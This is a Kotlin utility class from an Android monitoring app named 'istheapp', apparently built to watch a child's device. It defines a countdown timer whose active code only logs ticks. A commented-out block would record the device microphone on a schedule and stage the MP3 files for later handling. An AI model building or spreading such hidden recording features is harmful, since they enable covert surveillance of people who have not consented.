package com.github.midros.istheapp.utils


import android.content.Context
import android.media.MediaRecorder
import android.os.CountDownTimer
import android.util.Log
import android.util.Log.i
import com.github.midros.istheapp.data.model.ChildRecording
import com.github.midros.istheapp.services.accessibilityData.InteractorAccessibilityData
import com.github.midros.istheapp.utils.Consts.TAG
import com.github.midros.istheapp.utils.FileHelper.getFilePath
//import com.pawegio.kandroid.i

import io.reactivex.disposables.CompositeDisposable
import java.io.File
import javax.inject.Inject
import java.text.SimpleDateFormat
import java.util.*

//import com.google.firebase.database.FirebaseDatabase
//import com.google.firebase.database.DatabaseReference

/**
 * Created by luis rafael on 19/03/18.
 */
class MyCountDownTimer( startTime: Long, interval: Long, private val timer: ((timer: Long) -> Unit)? = null, private val func: () -> Unit) : CountDownTimer(startTime, interval) {
    @Inject
    lateinit var interactor: InteractorAccessibilityData

//    @Inject
//    lateinit var interactor: InteractorNotificationService
    private var startTime = (1 * 60 * 1440000).toLong()
    private var interval = (1 * 1000).toLong()

    private var disposable: CompositeDisposable = CompositeDisposable()
    private var timer2: MyCountDownTimer? = null
    private var recorder: MediaRecorderUtils = MediaRecorderUtils {
        //    cancelTimer()
        FileHelper.deleteFile("hhh")
    }
    private var fileName: String? = null
    private var dateTime: String? = null
    private var nameAudio: String = ""

    // private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)

    override fun onFinish() = func()

    override fun onTick(t: Long) {
        i(TAG, "timerxx $t");
        val sdf = SimpleDateFormat("EEEE")
        val d = Date()
        val day = sdf.format(d)
        val hour: Int = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
        try {
//                if (!File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").exists() && File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/records.txt").exists()) {
//
//                    nameAudio = ConstFun.getRandomNumeric()
//                    dateTime = ConstFun.getDateTime() //.replace(":", "-") //.replace(".", "")
//                    fileName =  "/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/" + dateTime + "--.mp3" //context.getFileNameAudio(nameAudio, dateTime)
//                    File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").createNewFile()
//                    recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
//                    timer2 = MyCountDownTimer(60 * 60 * 1000, (1000 * 60).toLong(), { // 1 min = 60 * 1000
//                    //       setIntervalRecord(it)
//                            i(TAG, "timer333... $t");
//                    }) {
//                        i(TAG, "fin recording $t");
//                        recorder.stopRecording {
//                      //      sendFileCall()
//                            val fileNameDest = fileName!!.replace("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/","/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecords/")
//                            File(fileName).let { sourceFile ->
//                                sourceFile.copyTo(File(fileNameDest))
//                                sourceFile.delete()
//                            }
//                        }
//                        Log.i("finishRecording", "finishRecording")
//                    }
//                    timer2!!.start()
//                    i(TAG, "inicia timer stick $t");
//                }
        } catch (e: Throwable) {
            Log.i("errorrrr Mycounter", e.message.toString())
        }
    }

    private fun sendFileCall() {
        i(TAG, "finnn")
    }

}